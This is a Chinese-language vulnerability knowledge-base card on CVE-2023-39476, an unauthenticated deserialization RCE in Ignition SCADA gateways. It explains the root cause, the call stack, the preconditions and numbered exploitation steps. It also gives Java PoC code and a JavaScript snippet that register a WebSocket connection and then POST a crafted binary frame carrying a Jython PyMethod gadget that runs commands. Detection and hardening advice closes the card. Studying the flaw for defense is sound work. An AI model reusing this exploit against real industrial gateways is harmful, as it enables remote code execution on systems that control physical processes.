---
id: web-java-deser-ignition-javaserializationcodec-ws-datachannel-rce
title: Ignition JavaSerializationCodec WebSocket 数据通道反序列化 RCE（CVE-2023-39476）：ws-control 注册 incoming 连接后 POST ws-datachannel 触发 readObject
type: scenario
domain: web
path: web/java/deserialization
technique: ignition-javaserializationcodec-ws-datachannel-deserialization
tags:
- java
- deserialization
- rce
- ignition
- scada
- websocket
- metro
- jython
- pymethod
- unauthenticated
cve:
- CVE-2023-39476
severity: high
confidence: high
status: verified
created: '2026-11-13'
updated: '2026-11-13'
affected_versions: Ignition 8.1.30、8.1.31（原文实测两版均未修复）
verification:
  verified_by: verifier-V684
  verified_at: '2026-11-13T14:13:41+08:00'
  notes: 已对照原文与全部26图核对：JavaSerializationCodec.decode→createObjectInputStream→readObject(img05)、ServerMessage.decodePayload(img06/08)、ConnectionWatcher.handle 按 _conn_ 前缀进 handleConnectionMessage(img07)、onDataReceived→forward(img09/10)、DataChannelServlet SERVLET_NAME/MESSAGING_URI 与 doPost 的 getIncomingBySystemName(img11/17/18)、getRequiredServletsExternal 同时装 ws-control/ws-datachannel(img16)、WSChannelManager 设 /system 路径并 addServlet(img12)、service 的 useSsl&&!requestSecure 与端口校验(放图核对为 if (useSsl && !requestSecure))(img15)、Require SSL 默认 true(img14)、Connection Policy 三态逻辑(img22/23)、ws-control 升级协商 CreatorNegotiator→createWebSocket(img19-21)、JS 取得 remoteConnectionId=ignition-win-a4201ucqfrn(img24)、incoming 非空(img25)、java.exe 子进程 calc.exe/cmd.exe 证明链已打通(img26)均与原文一致。affected_versions 按原文显式标记保留：安装测试用 8.1.30，『新版本』段明确 8.1.31 官网最新版仍未修复。修正：步骤3与PoC补回原文 exp 中 senderUrl 之后的 writeInt(1)（注释 readObject for ServerMessage），原卡遗漏。未验证点：HTTPS+mTLS 8060 路径原文未完成（仅 HTTP 关闭 Require SSL 路径打通），exp 未本机复跑。dedup_review
    成立：CVE-2023-50220 storeforward 卡入口/触发/协议帧不同，仅复用 Jython PyMethod gadget（该 gadget 已另有 merged 卡），非同一链；dup-scan 无本篇 pair。frontmatter 无 sources/source_url。
url: /docs/web/java/deserialization/web-java-deser-ignition-javaserializationcodec-ws-datachannel-rce/
draft: false
kb_aliases:
- CVE-2023-39476
- Ignition JavaSerializationCodec
- ws-datachannel-servlet 反序列化
- ws-control-servlet
- Ignition Metro WebSocket RCE
- ServerMessage decodePayload
- Ignition Jython PyMethod RCE
---

## 一句话结论

Inductive Automation Ignition（8.1.30/8.1.31）的 Metro WebSocket 数据通道把 HTTP 请求体当作序列化消息处理：先通过 `/system/ws-control-servlet` 完成 WebSocket 升级，在 `ConnectionWatcher` 的 `incoming` 表里注册一个 incoming 连接（服务端回消息给出 `remoteConnectionId`），再向 `/system/ws-datachannel-servlet` POST 自定义二进制帧，`DataChannelServlet.doPost → WebSocketConnection.onDataReceived → forward → ConnectionWatcher.handle → handleConnectionMessage → ServerMessage.decodePayload → JavaSerializationCodec.decode → ObjectInputStream.readObject` 直接反序列化攻击者可控字节，配合 classpath 自带的 Jython `PyMethod` gadget 执行任意命令。ZDI 将其标为未授权；但实际打点需要管理员侧两项配置放宽：关闭 `Require SSL`（默认 true，否则 403）与把 Gateway Network 的 Connection Policy 设为 `Unrestricted` 或把攻击者加入白名单（默认 ApprovedOnly）。

## 原理

- **反序列化 sink**：`com.inductiveautomation.metro.impl.codecs.JavaSerializationCodec` 实现 `MessageCodec`，`decode(InputStream)` 里 `createObjectInputStream(inputStream)` 后直接 `in.readObject()`；`ServerMessage.decodePayload()` 用它解析消息 payload，后续 `ServerMessage.getIntentName()` 以 `_conn_` 开头的消息会被 `ConnectionWatcher.handleConnectionMessage()` 处理，其中 `message.decodePayload()` 走到上述 readObject。入口方法没有类型白名单/过滤器（文章测试版本）。
- **HTTP 入口与协议帧**：`DataChannelServlet extends HttpServlet`，`SERVLET_NAME="ws-datachannel-servlet"`、`MESSAGING_URI="/ws-datachannel-servlet"`，由 `WebSocketFactory.getRequiredServletsExternal()` 与 `ws-control-servlet` 一起动态安装，应用路径 `/system`，最终路由 `/system/ws-datachannel-servlet`。`doPost` 先 `ProtocolHeader.decode(inputStream)` 解析头（magic、版本、messageId、opCode、subCode、flags、senderId、targetAddress、senderUrl），再用 `header.getSenderId()` 调 `factory.getIncomingBySystemName(connectionId)` 查找已注册连接，命中后调用该 `WebSocketConnection.onDataReceived(header, inputStream, outputStream)`；没命中则报 “connection id ... was not found”。
- **为什么要先建 WebSocket**：`DataChannelServlet.doPost` 只处理 `getIncomingBySystemName` 能找到的连接（`incoming` 表由 `putIncomingConnection` 填充）。`putIncomingConnection` 只在 `WebSocketFactory.createWebSocket` 创建 `MetroWebSocket(Direction.Incoming)` 时被调用，而它由 `ws-control-servlet`（Jetty WebSocketServlet）的升级协商 `CreatorNegotiator.negotiate → creator.createWebSocket` 触发。因此攻击序列是“先 WebSocket 注册 incoming，再用 HTTP 数据通道发序列化消息”。
- **createWebSocket 的校验**：`useSsl && !requestSecure` → 403 Bad scheme；`requestPort != localHttpPort/localHttpsPort` → 403 Bad port；`url` 参数必须包含 `httpServletRequest.getRemoteAddr()`，否则把 URL 的 host 改写成 remoteAddr；随后 `connectionSecurityPlugin.checkConnection` 按 Connection Policy 校验：
  - `Unrestricted` → SecurityOK；
  - `ApprovedOnly`（默认）→ 只有已批准连接才 OK；
  - `SpecifiedList` → 系统名在白名单才 OK。
  失败则返回 `SecurityFail`，`resp.sendForbidden("Approval required")` 且不创建连接。
- **数据通道 service 的校验**：`DataChannelServlet.service` 同样检查 `webSocketFactory.isUseSsl()` 与请求是否 SSL、`req.getLocalPort()` 是否等于对应端口；默认 `Require SSL=true`，直接 GET/POST 返回 403 Forbidden（原文先看到 403，后台取消勾选后才能打）。HTTPS（8060）路径遇到 `ERR_BAD_SSL_CLIENT_AUTH_CERT`，即 mTLS 双向认证，原文未打通。
- **完整调用栈**（原文）：
  ```text
  readObject      java.io.ObjectInputStream
  decode          com.inductiveautomation.metro.impl.codecs.JavaSerializationCodec
  decodePayload   com.inductiveautomation.metro.impl.transport.ServerMessage
  handleConnectionMessage / handle  com.inductiveautomation.metro.impl.ConnectionWatcher
  forward         com.inductiveautomation.metro.impl.protocol.websocket.WebSocketConnection
  onDataReceived  ...
  doPost          com.inductiveautomation.metro.impl.protocol.websocket.servlet.DataChannelServlet
  ```
- **gadget**：Ignition 自带 Jython（`jython-ia-2.7.2.x`）。ysoserial 的 Jython 链（PR #200）用 `BuiltinFunctions`（index=18 的 `eval`）+ `PyMethod` 作为 `Comparator` 动态代理 handler，装进 `PriorityQueue`（反射设置 `queue`/`size`）；反序列化 heapify 时触发 `compare → PyMethod.invoke → eval`，执行 `__import__('os').system(cmd)`。`PyFunction` 变体在该定制版 Jython 中因 `readResolve` 抛异常不可用，改用 `PyMethod`（详见关联卡）。
- **危害**：网关进程（Java，通常 SYSTEM/服务账户）执行任意命令；Ignition 常用于工业自动化，可进一步横向到 SCADA 网络。

## 触发条件

- 目标为 Ignition 8.1.30 / 8.1.31（原文实测均未修复；ZDI-23-1046 对应 CVE-2023-39476），Metro WebSocket 服务随网关启用（默认 8088；HTTPS 8060）。
- 管理员侧配置放宽：Gateway Network 关闭 `Require SSL`（默认 true），且 Connection Policy 为 `Unrestricted` 或攻击者系统名在 Specified List 白名单（默认 ApprovedOnly）。这两项在暴露网关/集成环境中常被关闭或放宽。
- 攻击者能访问 8088（http）端口，并能向 `/system/ws-control-servlet` 发起 WebSocket 升级、向 `/system/ws-datachannel-servlet` 发 POST。
- classpath 存在可用 gadget（默认安装自带 Jython）。

## 利用步骤

1. **确认配置**：访问 `/system/ws-datachannel-servlet`；若 403 且 body/日志提示 Bad scheme，说明 `Require SSL` 仍开启（默认），需要目标已关闭或改走 HTTPS+mTLS（本文未打通后者）。
2. **注册 incoming 连接**：向 `ws://host:8088/system/ws-control-servlet?name=<name>&uuid=<uuid>&url=http://host:8088/system` 发起 WebSocket 升级（浏览器 JS 或手工 HTTP Upgrade）；`url` 必须包含本机 `remoteAddr`，`name` 为发送方系统名。成功后服务端回消息 `remoteConnectionId=<id>`（或响应头 `remoteSystemId`），`incoming` 表中有该连接。
3. **构造数据通道请求体**：按 `ProtocolHeader` 字段顺序写：magicBytes=`18753`（0x4941）、protocolVersion=`1`、messageId(short)、opCode(int)、subCode(int)、flags(byte)、senderId（short 长度 + 字符，与第 2 步 `name` 一致）、targetAddress（short 长度 + 字符，填 remoteConnectionId/remoteSystemId）、senderUrl（short 长度 + 字符）、1 个 int（原文 exp 中 `writeInt(1)`，注释为 “readObject for ServerMessage”）、`ServerMessageHeader` 序列化长度(int)+字节、随后是恶意 gadget 的序列化字节。
   `ServerMessageHeader` 用反射构造（示例 `_conn_svr`、`_js_`），`headersValues` 里放 `_source_=<remoteSystemId>`、`replyrequested=true`，使 `ConnectionWatcher.handle` 走 `handleConnectionMessage → decodePayload`。
4. **发送并触发**：POST 到 `http://host:8088/system/ws-datachannel-servlet`，`DataChannelServlet.doPost` 找到 incoming 连接后进入 `onDataReceived → … → JavaSerializationCodec.decode → readObject`，gadget 弹出 calc/执行命令（原文 Process Explorer 可见 `calc.exe`/`cmd.exe`）。
5. **失败排查**：403 `Bad scheme`/`Bad port` → 端口/SSL 配置不匹配；`connection id ... was not found` → 第 2 步未成功注册或 senderId 不一致；`SecurityFail`/`Approval required` → Connection Policy 不是 Unrestricted/未白名单。

## PoC

原文 Java 11 `HttpClient` 关键部分（省略 import；gadget 构造见关联卡，未在本机复跑）：

```java
// 1) WebSocket 升级换取 remoteConnectionId
String url = "http://172.16.1.152:8088";
HttpRequest request = HttpRequest.newBuilder()
    .uri(URI.create(url + "/system/ws-control-servlet?name=qq&uuid=1a7e39e1-1ca4-405f-bfb3-6d971d6e7211&url=http://localhost:8088/system"))
    .GET()
    .header("Connection", "Upgrade")
    .header("Sec-WebSocket-Version", "13")
    .header("Sec-WebSocket-Key", "cJA5QIfEfnrZr7rrJ+3urg==")
    .header("Upgrade", "websocket").build();
HttpResponse<String> response = httpClient.send(request, HttpResponse.BodyHandlers.ofString());
String remoteSystemId = response.headers().map().get("remoteSystemId").get(0).split("\\|")[0];

// 2) 按 ProtocolHeader 组装数据通道消息
ByteArrayOutputStream stream = new ByteArrayOutputStream();
DataOutputStream out = new DataOutputStream(stream);
out.writeInt(18753);      // magicBytes
out.writeInt(1);          // protocolVersion
out.writeShort(1);        // messageId
out.writeInt(1);          // opCode
out.writeInt(1);          // subCode
out.writeByte(1);         // flags
out.writeShort(name.length()); out.writeChars(name);                 // senderId = "qq"
out.writeShort(remoteSystemId.length()); out.writeChars(remoteSystemId); // targetAddress
out.writeShort(1); out.writeChar('/');                                // senderUrl
out.writeInt(1);   // 原文 exp 注释 "readObject for ServerMessage"
// ServerMessageHeader：反射构造 _conn_svr，headersValues 放 _source_/replyrequested
byte[] header = serialize(serverMessageHeader);
out.writeInt(header.length); out.write(header);
// 3) 恶意 gadget
out.write(serialize(getObj("calc")));   // PriorityQueue + PyMethod(BuiltinFunctions#eval)

HttpRequest attack = HttpRequest.newBuilder(URI.create(url + "/system/ws-datachannel-servlet"))
    .POST(HttpRequest.BodyPublishers.ofByteArray(stream.toByteArray())).build();
httpClient.send(attack, HttpResponse.BodyHandlers.ofString());
```

浏览器侧获取 remoteConnectionId 的最小 JS（原文）：

```javascript
let socket = new WebSocket("ws://172.16.1.152:8088/system/ws-control-servlet?name=q&uuid=6a7e39e1-1ca4-405f-bfb3-6d971d6e7211&url=http://172.16.1.152:8088/system");
socket.onmessage = e => alert(`[message] Data received from server: ${e.data}`); // remoteConnectionId=ignition-win-...
```

## 变体与关联

- **同产品另一入口**：[[web-java-deser-ignition-storeforward-xml-base64-jython-pymethod]]（CVE-2023-50220，需后台管理员会话，XML 导入经 `Base64XmlReader` 反序列化）；本卡是 WebSocket 数据通道入口，门槛/路由/协议帧完全不同，但复用同一 Jython gadget。
- **gadget 卡**：[[web-java-deser-jython-pymethod-proxy-builtin-eval]]（本卡使用的 `BuiltinFunctions#eval` 链）、[[web-java-deser-jython-pymethod-proxy-lookup-jndi]]（换成 JNDI 终端）、[[web-java-deser-jython-pyfunction-pybytecode]]（Jython <=2.5.2 原链）。
- **协议特点**：数据通道必须由 `ws-control-servlet` 先注册 incoming 连接；凡是暴露 Metro/Gateway Network 的 Ignition 都可能存在类似“WebSocket 注册 + HTTP 数据通道”组合，测试时先看 `/system/*` servlet 的安装列表与 SSL/端口校验。
- **边界**：默认 `Require SSL=true` 与 `ApprovedOnly` 会阻断未授权利用；HTTPS 路径需要 mTLS 客户端证书（原文未打通）。因此“未授权”能否落地取决于目标配置。

## 检测与防御

- **修复/升级**：升级到修复版本（原文称 8.1.31 仍未修复；同产品 8.1.35 引入了 `CompositeClassRejectListFilter` 类黑名单，可作为参考）。持续关注该产品 Metro 组件公告。
- **配置加固**：保持 `Require SSL=true`（必要时启用 Two Way Auth）；Gateway Network Connection Policy 使用 `ApprovedOnly` 或严格 `Specified List`；不使用时禁用 Gateway Network/WebSocket 服务，8088/8060 不对不可信网络开放。
- **检测**：监控 `/system/ws-control-servlet` 的 WebSocket 升级后紧跟同源 IP 对 `/system/ws-datachannel-servlet` 的 POST；数据通道请求体以 `49 41 00 00 00 01`（magic 0x4941、version 1）开头且内含 `ac ed 00 05` Java 序列化魔数；网关日志中的 `Bad scheme`/`Bad port`/`SecurityFail`/`connection id ... was not found` 可作为探测痕迹；网关进程异常创建 `calc.exe`/`cmd.exe`/`powershell` 子进程。
- **检测（主机）**：对 Java 进程加载 Jython 类、`ObjectInputStream` 反序列化黑名单类（`org.python.core.PyMethod` 等）告警；启用 JVM `jdk.serialFilter`。
